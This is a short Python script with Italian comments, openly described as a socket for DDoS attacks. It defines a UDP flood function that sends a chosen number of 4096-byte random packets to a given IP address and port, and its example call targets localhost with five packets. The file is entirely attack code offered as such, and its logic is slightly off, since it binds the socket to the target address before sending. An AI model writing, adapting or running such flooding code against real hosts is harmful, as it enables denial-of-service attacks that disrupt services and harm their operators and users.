#!/usr/bin/env python


"""
Creazione di un socket
per attacchi ddos
"""


import socket
import random


def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
    """ Creazione di un udp flood """
    data_to_send = random._urandom(4096)
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except ConnectionError as error:
        print(error)
    except OSError:
        print("Non posso creare un socket ad un ip che non ho.")
    else:
        target = (indirizzo_ip, numero_porta)
        my_socket.bind((indirizzo_ip, numero_porta))
        print(f"Il target selezionato è: {target}")
        for x in range(0, numero_pacchetti):
            my_socket.sendto(data_to_send, target)
            print(f"N:{x} - UDP inviati")
        my_socket.close()

        return indirizzo_ip, numero_porta, numero_pacchetti


udp_flood_v1("127.0.0.1", 5555, 5)
